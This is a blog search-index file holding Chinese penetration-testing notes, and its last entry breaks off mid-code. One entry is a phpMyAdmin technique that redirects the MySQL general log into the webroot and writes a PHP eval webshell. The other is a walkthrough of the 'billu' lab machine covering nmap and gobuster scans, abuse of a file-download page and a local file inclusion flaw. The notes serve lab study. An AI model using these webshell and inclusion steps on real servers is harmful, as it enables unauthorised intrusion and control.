<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phpmyadmin 日志getshell</title>
      <link href="/2023/11/28/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/phpmyadmin%E6%97%A5%E5%BF%97getshell/"/>
      <url>/2023/11/28/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/phpmyadmin%E6%97%A5%E5%BF%97getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadmin-日志getshell"><a href="#phpmyadmin-日志getshell" class="headerlink" title="phpmyadmin 日志getshell"></a>phpmyadmin 日志getshell</h1><h2 id="前提：拥有开启日志或修改日志的权限"><a href="#前提：拥有开启日志或修改日志的权限" class="headerlink" title="前提：拥有开启日志或修改日志的权限"></a>前提：拥有开启日志或修改日志的权限</h2><h2 id="查看日志是否开启"><a href="#查看日志是否开启" class="headerlink" title="查看日志是否开启"></a>查看日志是否开启</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> ‘general<span class="operator">%</span>’;</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231128001425463.png" alt="image-20231128001425463"></p><h2 id="开启日志"><a href="#开启日志" class="headerlink" title="开启日志"></a>开启日志</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812144205330.png" alt="image-20230812144205330"></p><h2 id="修改日志的路径到一个外部可访问的路径"><a href="#修改日志的路径到一个外部可访问的路径" class="headerlink" title="修改日志的路径到一个外部可访问的路径"></a>修改日志的路径到一个外部可访问的路径</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;C:/phpStudy/WWW/rizhi.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="利用phpmyadmin日志的漏洞，写入一句话木马"><a href="#利用phpmyadmin日志的漏洞，写入一句话木马" class="headerlink" title="利用phpmyadmin日志的漏洞，写入一句话木马"></a>利用phpmyadmin日志的漏洞，写入一句话木马</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>此时木马已经被记录在日志里了</p><p>靶机视角：</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812151901263.png" alt="image-20230812151901263"></p><h2 id="利用远控工具链接一句话木马（蚁剑）"><a href="#利用远控工具链接一句话木马（蚁剑）" class="headerlink" title="利用远控工具链接一句话木马（蚁剑）"></a>利用远控工具链接一句话木马（蚁剑）</h2><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812154346115.png" alt="image-20230812154346115"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812154426380.png" alt="image-20230812154426380"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812155151866.png" alt="image-20230812155151866"></p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> getshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bilLu</title>
      <link href="/2023/11/27/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/bilLu/"/>
      <url>/2023/11/27/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/bilLu/</url>
      
        <content type="html"><![CDATA[<h1 id="bilLu"><a href="#bilLu" class="headerlink" title="bilLu"></a>bilLu</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span> -p- --min-rate=<span class="number">100000</span> -oN nmapscan/ports</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Nmap <span class="number">7</span>.<span class="number">93</span> scan initiated Mon Nov <span class="number">27</span> <span class="number">12</span>:<span class="number">26</span>:<span class="number">58</span> <span class="number">2023</span> as: nmap -sT -p- --min-rate=<span class="number">10000</span> -oN nmapscan/ports <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> indishell (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00034</span>s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: <span class="number">65533</span> closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">1</span>F:<span class="number">3</span>E:D7 (VMware)</span><br><span class="line"></span><br><span class="line"># Nmap done <span class="built_in">at</span> Mon Nov <span class="number">27</span> <span class="number">12</span>:<span class="number">27</span>:<span class="number">01</span> <span class="number">2023</span> -- <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">3</span>.<span class="number">45</span> seconds</span><br></pre></td></tr></table></figure><p>发现只开启两个端口</p></blockquote><h2 id="详细服务扫描"><a href="#详细服务扫描" class="headerlink" title="详细服务扫描"></a>详细服务扫描</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sC -sV -O -p22,<span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span> -oN nmapscan/detail</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Nmap <span class="number">7</span>.<span class="number">93</span> scan initiated Mon Nov <span class="number">27</span> <span class="number">12</span>:<span class="number">28</span>:<span class="number">37</span> <span class="number">2023</span> as: nmap -sT -sC -sV -O -p22,<span class="number">80</span> -oN nmapscan/detail <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> indishell (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00032</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">5</span>.<span class="number">9</span>p1 Debian <span class="number">5</span>ubuntu1.<span class="number">4</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">1024</span> facfa252c4faf575a7e2bd60833e7bde (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">88310</span>c789880ef33fa2622edd09bbaf8 (RSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">0</span>e5e330350c91eb3e75139a44a1064ca (ECDSA)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2</span>.<span class="number">2</span>.<span class="number">22</span> ((Ubuntu))</span><br><span class="line">|_http-<span class="built_in">title</span>: --==[[IndiShell Lab]]==--</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag <span class="keyword">not</span> <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/<span class="number">2</span>.<span class="number">2</span>.<span class="number">22</span> (Ubuntu)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">1</span>F:<span class="number">3</span>E:D7 (VMware)</span><br><span class="line"><span class="function">Warning: <span class="title">OSScan</span> <span class="title">results</span> <span class="title">may</span> <span class="title">be</span> <span class="title">unreliable</span> <span class="title">because</span> <span class="title">we</span> <span class="title">could</span> <span class="title">not</span> <span class="title">find</span> <span class="title">at</span> <span class="title">least</span> 1 <span class="title">open</span> <span class="title">and</span> 1 <span class="title">closed</span> <span class="title">port</span></span></span><br><span class="line"><span class="function"><span class="title">Device</span> <span class="title">type</span>: <span class="title">general</span> <span class="title">purpose</span></span></span><br><span class="line"><span class="function"><span class="title">Running</span>: <span class="title">Linux</span> 3.<span class="title">X</span>|4.<span class="title">X</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:3 <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:4</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">details</span>: <span class="title">Linux</span> 3.2 - 4.9</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Distance</span>: 1 <span class="title">hop</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">OS</span>: <span class="title">Linux</span>; <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">and</span> <span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap.org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="function"># <span class="title">Nmap</span> <span class="title">done</span> <span class="title">at</span> <span class="title">Mon</span> <span class="title">Nov</span> 27 12:28:45 2023 -- 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 8.42 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure><ul><li>推测ssh使用公钥登录</li><li>httponly没设置，也就是说js脚本可以读cookie。xss？一般打靶机不考虑用xss</li><li>linux 3.x~4.x 提权时可以考虑使用脏牛漏洞</li></ul></blockquote><h2 id="默认脚本漏洞扫描"><a href="#默认脚本漏洞扫描" class="headerlink" title="默认脚本漏洞扫描"></a>默认脚本漏洞扫描</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -script=vuln -p22,<span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span> -oN nmapscan/vuln</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">11</span>-<span class="number">27</span> <span class="number">12</span>:<span class="number">59</span> CST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     <span class="number">224</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">251</span></span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-<span class="number">2011</span>-<span class="number">1002</span>).</span><br><span class="line">|_  Hosts are all up (<span class="keyword">not</span> vulnerable).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> indishell (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00027</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">|_http-csrf: Couldn&#x27;t <span class="built_in">find</span> any CSRF vulnerabilities.</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag <span class="keyword">not</span> <span class="built_in">set</span></span><br><span class="line">|_http-stored-xss: Couldn&#x27;t <span class="built_in">find</span> any stored XSS vulnerabilities.</span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: <span class="number">127</span>.<span class="number">0</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t <span class="built_in">find</span> any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /test.php: Test page</span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on &#x27;apache/<span class="number">2</span>.<span class="number">2</span>.<span class="number">22</span> (ubuntu)&#x27;</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">1</span>F:<span class="number">3</span>E:D7 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">56</span>.<span class="number">04</span> seconds</span><br></pre></td></tr></table></figure><p>注意到80端口（http）的扫描结果枚举出了一个test.php和一个images目录</p></blockquote><h2 id="http服务简单测试"><a href="#http服务简单测试" class="headerlink" title="http服务简单测试"></a>http服务简单测试</h2><p>访问靶机网页，发现index页面是个可能存在sql注入的页面</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127131705032.png"></p><p>简单尝试万能口令，发现不成</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127132749932.png" alt="image-20231127132749932"></p><p>使用sqlmap</p><p>sqlmap表示哪个字段都没法注入</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127134914925.png" alt="image-20231127134914925"></p><p>暂时放弃这里。</p><h3 id="利用收集到的信息"><a href="#利用收集到的信息" class="headerlink" title="利用收集到的信息"></a>利用收集到的信息</h3><p>前面信息收集发现了 /test.php 和 /image 两个页面</p><p>查看这两个页面</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127135150553.png" alt="image-20231127135150553"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127135211142.png" alt="image-20231127135211142"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>images页面存着网站的一些图片，可能存在隐写，先往后放一放</p><p>test.php提示“file”字段为空，要求提供“文件路径” 会不会存在文件包含？</p><p>先重点关注这个页面</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127135150553.png" alt="image-20231127135150553"></p><p>思路：先简单试一下get和post往file字段里传值，如果不行就fuzz看看能不能出参数</p><p>尝试post成功获取到文件（test.php）：</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127141156346.png" alt="image-20231127141156346"></p><p>查看test.php里的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_download</span>(<span class="params"><span class="variable">$download</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$download</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Description: File Transfer&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Expires: 0&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Pragma: public&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Accept-Ranges: bytes&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$download</span>).<span class="string">&#x27;&quot;&#x27;</span>); </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$download</span>));</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>); </span><br><span class="line"><span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line"><span class="title function_ invoke__">flush</span>();</span><br><span class="line"><span class="title function_ invoke__">readfile</span> (<span class="variable">$download</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file not found&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">file_download</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\&#x27;file\&#x27; parameter is empty. Please provide file path in \&#x27;file\&#x27; parameter &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以让客户端下载服务器的文件，就可以借助这个页面看源码了。</p><h2 id="尝试爆破网站目录，借助test-php这个页面下载源码"><a href="#尝试爆破网站目录，借助test-php这个页面下载源码" class="headerlink" title="尝试爆破网站目录，借助test.php这个页面下载源码"></a>尝试爆破网站目录，借助test.php这个页面下载源码</h2><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# gobuster <span class="built_in">dir</span> -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>/ -w /usr/share/wordlists/dirb/big.txt -x php,rar,txt,zip,rar </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/big.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3</span>.<span class="number">5</span></span><br><span class="line">[+] Extensions:              rar,txt,zip,php</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">11</span>/<span class="number">27</span> <span class="number">15</span>:<span class="number">07</span>:<span class="number">57</span> Starting gobuster <span class="keyword">in</span> directory enumeration <span class="built_in">mode</span></span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess.php        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/.htaccess.txt        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/.htaccess.zip        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/.htaccess            (Status: <span class="number">403</span>) [Size: <span class="number">291</span>]</span><br><span class="line">/.htaccess.rar        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/.htpasswd            (Status: <span class="number">403</span>) [Size: <span class="number">291</span>]</span><br><span class="line">/.htpasswd.php        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/.htpasswd.zip        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/.htpasswd.rar        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/.htpasswd.txt        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/add                  (Status: <span class="number">200</span>) [Size: <span class="number">307</span>]</span><br><span class="line">/add.php              (Status: <span class="number">200</span>) [Size: <span class="number">307</span>]</span><br><span class="line">/c.php                (Status: <span class="number">200</span>) [Size: <span class="number">1</span>]</span><br><span class="line">/c                    (Status: <span class="number">200</span>) [Size: <span class="number">1</span>]</span><br><span class="line">/cgi-bin/             (Status: <span class="number">403</span>) [Size: <span class="number">290</span>]</span><br><span class="line">/head                 (Status: <span class="number">200</span>) [Size: <span class="number">2793</span>]</span><br><span class="line">/head.php             (Status: <span class="number">200</span>) [Size: <span class="number">2793</span>]</span><br><span class="line">/images               (Status: <span class="number">301</span>) [Size: <span class="number">317</span>] [--&gt; http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>/images/]</span><br><span class="line">/<span class="keyword">in</span>.php               (Status: <span class="number">200</span>) [Size: <span class="number">47529</span>]</span><br><span class="line">/<span class="keyword">in</span>                   (Status: <span class="number">200</span>) [Size: <span class="number">47525</span>]</span><br><span class="line">/index                (Status: <span class="number">200</span>) [Size: <span class="number">3267</span>]</span><br><span class="line">/index.php            (Status: <span class="number">200</span>) [Size: <span class="number">3267</span>]</span><br><span class="line">/panel                (Status: <span class="number">302</span>) [Size: <span class="number">2469</span>] [--&gt; index.php]</span><br><span class="line">/panel.php            (Status: <span class="number">302</span>) [Size: <span class="number">2469</span>] [--&gt; index.php]</span><br><span class="line">/phpmy                (Status: <span class="number">301</span>) [Size: <span class="number">316</span>] [--&gt; http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>/phpmy/]</span><br><span class="line">/server-status        (Status: <span class="number">403</span>) [Size: <span class="number">295</span>]</span><br><span class="line">/show.php             (Status: <span class="number">200</span>) [Size: <span class="number">1</span>]</span><br><span class="line">/show                 (Status: <span class="number">200</span>) [Size: <span class="number">1</span>]</span><br><span class="line">/test                 (Status: <span class="number">200</span>) [Size: <span class="number">72</span>]</span><br><span class="line">/test.php             (Status: <span class="number">200</span>) [Size: <span class="number">72</span>]</span><br><span class="line">/uploaded_images      (Status: <span class="number">301</span>) [Size: <span class="number">326</span>] [--&gt; http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>/uploaded_images/]</span><br><span class="line"><span class="function">Progress: 101369 / 102350 (99.04%)</span></span><br><span class="line"><span class="function">===============================================================</span></span><br><span class="line"><span class="function">2023/11/27 15:08:26 <span class="title">Finished</span></span></span><br><span class="line"><span class="function">===============================================================</span></span><br></pre></td></tr></table></figure><p>状态码为200的是可访问的页面。</p><p>此外，注意到有个phpmy页面，这个是phpmyadmin管理界面。</p><p>如果网站使用的是php+mysql的架构的话，那么大概率可以从源码中找到数据库的登录密码。</p></blockquote><p>把能拿到的文件都下下来看看</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127153554750.png" alt="image-20231127153554750"></p><p>in.php里有个phpinfo函数，访问此页面显示php信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127155424400.png" alt="image-20231127155424400"></p><p>在panel.php里发现其存在本地文件包含漏洞</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_POST[&#x27;continue&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$<span class="built_in">dir</span>=getcwd();</span><br><span class="line">$choice=str_replace(&#x27;./&#x27;,&#x27;&#x27;,$_POST[&#x27;load&#x27;]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($choice===&#x27;add&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">       include($<span class="built_in">dir</span>.&#x27;/&#x27;.$choice.&#x27;.php&#x27;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($choice===&#x27;show&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">include($<span class="built_in">dir</span>.&#x27;/&#x27;.$choice.&#x27;.php&#x27;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">include($<span 